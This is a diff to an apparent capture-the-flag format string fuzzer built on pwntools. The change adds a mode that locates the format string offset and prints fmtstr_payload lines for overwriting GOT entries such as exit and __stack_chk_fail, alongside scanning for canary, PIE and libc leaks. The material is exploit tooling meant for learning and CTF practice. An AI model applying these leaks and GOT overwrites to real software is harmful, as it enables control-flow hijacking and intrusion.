@@ -1,14 +1,15 @@
-import regex
 import click
-import time
+import regex
+from rich import print
 
 from pwn import *
 
 # --- main ---
 @click.command()
-@click.option('-x', '--max', type=int, help='The maximum number of offsets to fuzz. Defaults to 200.', default=200)
-@click.argument('binary')
-def cli(binary, max):
+@click.option('-b', '--binary', type=click.Path(exists=True), help='Challenge binary.')
+@click.option('-x', '--max', type=int, help='The maximum number of offsets to fuzz.', default=200, show_default=True)
+@click.option('-w', '--write', type=str, help='The name of the function you wish to overwrite something with in the GOT. Enables partial RELRO mode.', default=None)
+def cli(binary, max, write):
     """Automatic format string fuzzer by samuzora. 
 
     Currently, this fuzzer can fuzz:
@@ -63,23 +64,56 @@ def cli(binary, max):
                 else:
                     p.sendline(step)
                 if index == fmt_index:
-                    scan(i, p, keyword, elf, libc, offset, libcs, pies, canaries)
-            p.close()
-    except KeyboardInterrupt:
-        summary(progress, offset, canaries, pies, libcs)
-    else:
-        summary(progress, offset, canaries, pies, libcs)
+                    if write is None:
+                        # scan leak
+                        scan(i, p, keyword, elf, libc, offset, libcs, pies, canaries)
+                    elif write is not None:
+                        # we are in partial RELRO mode, just fuzz offset
+                        # recv until start of leak
+                        p.recvuntil(keyword[0])
+                        if keyword[1] != b'':
+                            # end of leak is not empty 
+                            leak = p.recvuntil(keyword[1], drop=True).strip()
+                        else:
+                            # end of leak is empty, just receive the rest of the input
+                            leak = p.clean().strip()
 
+                        # process leak
+                        if offset_check(leak, i):
+                            click.secho('Offset found', fg='blue')
+                            offset.append(i)
+                            print_got(elf, write, i)
+                            raise click.Abort
+            p.close()
+    except click.Abort:
+        pass
+    summary(progress, offset, canaries, pies, libcs)
+
+# --- print functions in GOT that can likely be used in overwrite ---
+def print_got(elf, write, i):
+    impt_functions = ['exit', '__stack_chk_fail', 'puts']
+    click.secho("--- suggestions for overwrite ---", fg='green')
+    for f in elf.got:
+        if f in impt_functions:
+            if f == '__stack_chk_fail':
+                click.secho(f"payload = fmtstr_payload({i}, {{elf.got['{f}']:elf.symbols['{write}']}}) + b'A'*1000 # overwrites {f} to {write} and modifies canary", italic=True)
+            else:
+                click.secho(f"payload = fmtstr_payload({i}, {{elf.got['{f}']:elf.symbols['{write}']}}) # overwrites {f} to {write}", italic=True)
+    click.secho("\n--- full GOT ---", fg='green')
+    print(elf.got)
+    
 # --- get route to format string ---
 def get_route():
     route = []
     keyword = []
     fmt_index = -1
+
+    # setup the stdin and stdout
     p = process(stdin=PTY, stdout=PTY)
     click.secho('--- binary start ---', fg='cyan')
     ou = bytes.decode(p.clean(), 'utf-8')
     click.echo(ou, nl=False)
-    while (match := regex.search("ST((?:0x[0-9a-f]+)|(?:\(nil\)))EN", ou)) == None:
+    while (match := regex.search(r"ST((?:0x[0-9a-f]+)|(?:\(nil\)))EN", ou)) is None:
         inp = bytes(input().strip(), 'utf-8')
         p.sendline(inp)
         route.append(inp)
@@ -90,8 +124,8 @@ def get_route():
     else:
         click.secho('\n--- binary end ---', fg='red')
         match = match.group(0)
-        start = regex.search(f"([\w\W]*){match}", ou).group(1)
-        end = regex.search(f"{match}([\w\W]*)", ou).group(1)
+        start = regex.search(fr"([\w\W]*){match}", ou).group(1)
+        end = regex.search(fr"{match}([\w\W]*)", ou).group(1)
         keyword.append(bytes(start[-10:], 'utf-8'))
         keyword.append(bytes(end[:10], 'utf-8'))
         p.close()
@@ -101,16 +135,22 @@ def get_route():
 def send_payload(i, step, p):
     payload = step.replace(b'ST%1$pEN', bytes(f'%{i}$p', 'utf-8'))
     p.sendline(payload)
+    print('', end='')
 
 # --- scan output for potential leaks ---
 def scan(i, p, keyword, elf, libc, offset, libcs, pies, canaries):
     if libc != None:
         libc_base = p.libs()[libc.path]
+    # recv until start of leak
     p.recvuntil(keyword[0])
     if keyword[1] != b'':
+        # end of leak is not empty 
         leak = p.recvuntil(keyword[1], drop=True).strip()
     else:
+        # end of leak is empty, just receive the rest of the input
         leak = p.clean().strip()
+
+    # process leak
     if offset_check(leak, i):
         click.secho('Offset found', fg='blue')
         offset.append(i)
@@ -149,6 +189,7 @@ def summary(progress, offset, canaries, pies, libcs):
         for canary in canaries:
             click.secho(f'\t%{canary}$p', fg='yellow')
 
+# --- checkers ---
 # --- check if leak is offset ---
 def offset_check(leak, i):
     try:
